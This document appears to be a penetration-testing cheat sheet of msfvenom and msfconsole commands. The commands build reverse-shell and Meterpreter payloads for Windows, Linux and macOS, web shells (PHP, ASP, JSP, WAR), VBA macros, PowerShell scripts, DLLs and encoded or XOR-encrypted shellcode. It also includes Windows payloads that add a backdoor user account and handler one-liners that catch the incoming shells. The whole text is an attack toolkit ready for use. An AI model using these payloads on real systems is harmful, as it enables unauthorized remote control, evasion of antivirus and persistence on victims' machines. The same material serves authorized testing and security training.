# msfvenom

% msfvenom, reverse shell

#plateform/linux #target/local #cat/ATTACK/REVERSE_SHELL 

## msfvenom - List available payloads
```
msfvenom --list-options payload
```

## msfvenom - Windows x86 Meterpreter Reverse TCP (unstaged)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o shell.exe
```

## msfvenom - Windows x64 Meterpreter Reverse TCP (unstaged)
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o shell_x64.exe
```

## msfvenom - Linux x86 Meterpreter Reverse TCP
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf -o shell.elf
```

## msfvenom - Linux x64 Meterpreter Reverse TCP
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<lhost|tun0> LPORT=<lport> PrependFork=true -f elf -o test.elf
```

## msfvenom - Windows x86 Meterpreter Reverse TCP (staged)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o shell.exe
```

## msfvenom - Windows x64 Meterpreter Reverse TCP (staged)
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o shell_x64.exe
```

## msfvenom - Windows x86 Shell Reverse TCP
```
msfvenom -p windows/shell/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o shell.exe
```

## msfvenom - Windows x64 Shell Reverse TCP
```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o shell_x64.exe
```

## msfvenom - Windows x86 Meterpreter Reverse TCP (encoded)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe
```

## msfvenom - Windows x64 Meterpreter Reverse TCP (encoded)
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -e x64/xor_dynamic -i 3 -f exe -o encoded_x64.exe
```

## msfvenom - macOS x86 Shell Reverse TCP
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f macho -o shell.macho
```

## msfvenom - macOS x64 Shell Reverse TCP
```
msfvenom -p osx/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f macho -o shell_x64.macho
```

## msfvenom - Windows x64 Meterpreter Reverse HTTPS (non-staged)
```
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<lhost> LPORT=<lport|443> -f exe -o /var/www/html/msfnonstaged.exe
```

## msfvenom - Windows x64 Meterpreter Reverse HTTPS (staged)
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<lhost> LPORT=<lport|443> -f exe -o /var/www/html/msfstaged.exe
```

## msfvenom - Windows x86 Meterpreter Reverse HTTPS (staged)
```
msfvenom -p windows/meterpreter/reverse_https LHOST=<lhost> LPORT=<lport|443> -f exe -o /var/www/html/msfstaged_x86.exe
```

## msfvenom - Windows x86 Meterpreter Reverse HTTPS (non-staged)
```
msfvenom -p windows/meterpreter_reverse_https LHOST=<lhost> LPORT=<lport|443> -f exe -o /var/www/html/msfnonstaged_x86.exe
```

## Web Payloads

## msfvenom - PHP Meterpreter Reverse TCP
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f raw -o shell.php
```

## msfvenom - ASP Meterpreter Reverse TCP
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f asp -o shell.asp
```

## msfvenom - JSP Java Meterpreter Reverse TCP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f raw -o shell.jsp
```

## msfvenom - WAR Payload
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f war -o shell.war
```

## msfvenom - VBA 32-bit Meterpreter Reverse HTTPS
```
msfvenom -p windows/meterpreter/reverse_https LHOST=<lhost> LPORT=<lport|443> EXITFUNC=thread -f vba -o shell.vba
```

## msfvenom - VBA 64-bit Meterpreter Reverse HTTPS
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<lhost> LPORT=<lport|443> EXITFUNC=thread -f vba -o shell_x64.vba
```

## msfvenom - PowerShell 32-bit Meterpreter Reverse HTTPS
```
msfvenom -p windows/meterpreter/reverse_https LHOST=<lhost> LPORT=<lport|443> EXITFUNC=thread -f psh -o shell.ps1
```

## msfvenom - PowerShell 64-bit Meterpreter Reverse HTTPS
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<lhost> LPORT=<lport|443> EXITFUNC=thread -f psh -o shell_x64.ps1
```

## msfvenom - DLL Payload (Windows x86 Meterpreter Reverse HTTPS)
```
msfvenom -p windows/meterpreter/reverse_https LHOST=<lhost> LPORT=<lport|443> -f dll -o output_x86.dll
```

## msfvenom - DLL Payload (Windows x64 Meterpreter Reverse HTTPS)
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<lhost> LPORT=<lport|443> -f dll -o output.dll
```

# Scripting Payloads

## msfvenom - Python Reverse Shell
```
msfvenom -p cmd/unix/reverse_python LHOST=<lhost> LPORT=<lport> -f raw -o shell.py
```

## msfvenom - Bash Unix Reverse Shell
```
msfvenom -p cmd/unix/reverse_bash LHOST=<lhost> LPORT=<lport> -f raw -o shell.sh
```

## msfvenom - Perl Unix Reverse Shell
```
msfvenom -p cmd/unix/reverse_perl LHOST=<lhost> LPORT=<lport> -f raw -o shell.pl
```

## msfvenom - PowerShell Reverse HTTPS (32-bit)
```
msfvenom -p windows/meterpreter/reverse_https LHOST=<lhost> LPORT=<lport|443> EXITFUNC=thread -f ps1 -o shell.ps1
```

## msfvenom - PowerShell Reverse HTTPS (64-bit)
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<lhost> LPORT=<lport|443> EXITFUNC=thread -f ps1 -o shell_x64.ps1
```

## msfvenom - Csharp 32-bit (xor encrypted)
```
msfvenom -p windows/meterpreter/reverse_https LHOST=<lhost> LPORT=<lport|443> --encrypt xor --encrypt-key <key> -f csharp -o shell_x86.cs
```

## msfvenom - Csharp 64-bit (xor encrypted)
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<lhost> LPORT=<lport|443> --encrypt xor --encrypt-key <key> -f csharp -o shell.cs
```

# msfvenom Shellcode

## msfvenom - Windows x86 Meterpreter Reverse TCP Shellcode
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f <language> -o shellcode_x86.<ext>
```

## msfvenom - Windows x64 Meterpreter Reverse TCP Shellcode
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f <language> -o shellcode_x64.<ext>
```

## msfvenom - Linux x86 Meterpreter Reverse TCP Shellcode
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f <language> -o shellcode_x86.<ext>
```

## msfvenom - Linux x64 Meterpreter Reverse TCP Shellcode
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f <language> -o shellcode_x64.<ext>
```

## msfvenom - macOS x86 Reverse TCP Shellcode
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f <language> -o shellcode_x86.<ext>
```

## msfvenom - macOS x64 Reverse TCP Shellcode
```
msfvenom -p osx/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f <language> -o shellcode_x64.<ext>
```

# msfvenom - Create User Payload

## msfvenom - Windows Add User Payload (x86)
```
msfvenom -p windows/adduser USER=<user|hacker> PASS='<pass|Hacker123$>' -f exe -o adduser_x86.exe
```

## msfvenom - Windows Add User Payload (x64)
```
msfvenom -p windows/x64/adduser USER=<user|hacker> PASS='<pass|Hacker123$>' -f exe -o adduser_x64.exe
```

# Metasploit Handler

## Metasploit Handler - Windows TCP 32-bit (staged)
```
msfconsole -x "use exploits/multi/handler; set lhost <lhost>; set lport <lport>; set payload windows/meterpreter/reverse_tcp; exploit"
```

## Metasploit Handler - Windows TCP 64-bit (staged)
```
msfconsole -x "use exploits/multi/handler; set lhost <lhost>; set lport <lport>; set payload windows/x64/meterpreter/reverse_tcp; exploit"
```

## Metasploit Handler - Windows HTTPS 32-bit (staged)
```
msfconsole -x "use exploits/multi/handler; set lhost <lhost>; set lport <lport|443>; set payload windows/meterpreter/reverse_https; set EXITFUNC thread; exploit"
```

## Metasploit Handler - Windows HTTPS 64-bit (staged)
```
msfconsole -x "use exploits/multi/handler; set lhost <lhost>; set lport <lport|443>; set payload windows/x64/meterpreter/reverse_https; exploit"
```

## Metasploit Handler - Windows HTTPS 32-bit (unstaged)
```
msfconsole -x "use exploits/multi/handler; set lhost <lhost>; set lport <lport|443>; set payload windows/meterpreter_reverse_https; exploit"
```

## Metasploit Handler - Windows HTTPS 64-bit (unstaged)
```
msfconsole -x "use exploits/multi/handler; set lhost <lhost>; set lport <lport|443>; set payload windows/x64/meterpreter_reverse_https; exploit"
```

## Metasploit Handler - Windows HTTPS 64-bit (staged, encoded xor)
```
msfconsole -x "use exploits/multi/handler; set lhost <lhost>; set lport <lport|443>; set payload windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder <encoder|x64/xor_dynamic>; exploit"
```

## Metasploit Handler - Linux TCP 32-bit (staged)
```
msfconsole -x "use exploits/multi/handler; set lhost <lhost|tun0>; set lport <lport|443>; set payload linux/x86/meterpreter/reverse_tcp; set EXITFUNC thread; exploit"
```

## Metasploit Handler - Linux TCP 64-bit (staged, encoded xor)
```
msfconsole -x "use exploits/multi/handler; set lhost <lhost|tun0>; set lport <lport|443>; set payload linux/x64/meterpreter/reverse_tcp; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; exploit"
```

## Metasploit Handler - macOS TCP 32-bit (staged)
```
msfconsole -x "use exploits/multi/handler; set lhost <lhost>; set lport <lport>; set payload osx/x86/shell_reverse_tcp; exploit"
```

## Metasploit Handler - macOS TCP 64-bit (staged)
```
msfconsole -x "use exploits/multi/handler; set lhost <lhost>; set lport <lport>; set payload osx/x64/shell_reverse_tcp; exploit"
```